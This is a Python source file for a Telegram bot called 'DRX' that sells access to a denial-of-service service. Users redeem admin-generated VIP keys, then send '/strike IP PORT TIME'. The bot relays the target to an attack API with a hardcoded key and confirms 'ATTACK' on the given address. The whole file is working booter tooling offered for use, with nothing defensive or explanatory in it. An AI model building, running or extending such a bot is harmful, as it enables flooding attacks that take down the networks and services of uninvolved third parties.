import telebot
import json
import requests
import os
import threading
import time

BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = os.environ.get('ADMIN_ID', '7837187893')
API_URL = os.environ.get('API_URL', 'http://localhost:8080/api/strike')
API_KEY = os.environ.get('API_KEY', 'BHAG_BHOSDIKE_2024')

if not BOT_TOKEN:
    print("Error: BOT_TOKEN not set!")
    exit()

bot = telebot.TeleBot(BOT_TOKEN)

USERS_DB = "users.json"
KEYS_DB = "keys.json"

def load(f):
    if os.path.exists(f):
        with open(f) as x:
            return json.load(x)
    return {}

def save(f, d):
    with open(f, 'w') as x:
        json.dump(d, x)

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "🔥 DRX ACTIVE\n/help")

@bot.message_handler(commands=['help'])
def help(m):
    bot.reply_to(m, "/strike IP PORT TIME\n/redeem KEY\n/me\n/status")

@bot.message_handler(commands=['gen'])
def gen(m):
    if str(m.from_user.id) != ADMIN_ID:
        return bot.reply_to(m, "Admin only")
    key = "VIP-" + os.urandom(3).hex().upper()
    keys = load(KEYS_DB)
    keys[key] = "1d"
    save(KEYS_DB, keys)
    bot.reply_to(m, f"Key: {key}")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    args = m.text.split()
    if len(args) < 2:
        return bot.reply_to(m, "/redeem KEY")
    keys = load(KEYS_DB)
    if args[1] in keys:
        users = load(USERS_DB)
        users[str(m.from_user.id)] = {"active": True}
        save(USERS_DB, users)
        del keys[args[1]]
        save(KEYS_DB, keys)
        bot.reply_to(m, "Activated!")
    else:
        bot.reply_to(m, "Invalid key")

@bot.message_handler(commands=['me'])
def me(m):
    users = load(USERS_DB)
    if str(m.from_user.id) in users:
        bot.reply_to(m, "Active Plan: Yes")
    else:
        bot.reply_to(m, "No active plan")

@bot.message_handler(commands=['strike'])
def strike(m):
    users = load(USERS_DB)
    if str(m.from_user.id) not in users:
        return bot.reply_to(m, "No plan! /redeem")
    
    args = m.text.split()
    if len(args) != 4:
        return bot.reply_to(m, "/strike IP PORT TIME")
    
    ip, port, sec = args[1], args[2], args[3]
    
    try:
        url = f"{API_URL}?key={API_KEY}&ip={ip}&port={port}&time={sec}"
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            bot.reply_to(m, f"✅ ATTACK: {ip}:{port} for {sec}s")
        else:
            bot.reply_to(m, f"Error: {r.text}")
    except Exception as e:
        bot.reply_to(m, f"API Error: {str(e)[:50]}")

@bot.message_handler(commands=['status'])
def status(m):
    bot.reply_to(m, f"Bot: Active\nAPI: {API_URL}")

print("Bot Starting...")
bot.polling()
